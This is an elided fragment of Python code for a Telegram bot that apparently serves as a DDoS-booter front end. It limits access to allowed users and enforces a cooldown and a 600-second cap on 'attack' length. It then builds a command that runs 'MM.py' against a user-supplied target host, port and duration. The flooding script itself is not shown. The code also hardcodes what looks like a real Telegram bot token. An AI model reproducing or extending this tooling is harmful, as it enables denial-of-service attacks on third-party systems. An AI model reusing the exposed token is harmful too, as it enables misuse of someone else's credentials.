...
bot = telebot.TeleBot('8813651105:AAGylBFfx5_JejGpwL7SJE8gu_5Wxklu0zg')
    ...
    if user_id in allowed_user_ids:
        ...
        if wait_time > 80:
            ...
            if len(command) == 4 or (not message.text.startswith('/') and len(command) == 3):
                ...
                if time_duration > 600:
                    response = "❌ **Error:** Time interval must be less than 600 seconds."
                else:
                    user_last_attack[user_id] = time.time()
                    start_attack_reply(message, target, port, time_duration)
                    full_command = f"python MM.py {target} {port} {time_duration}"
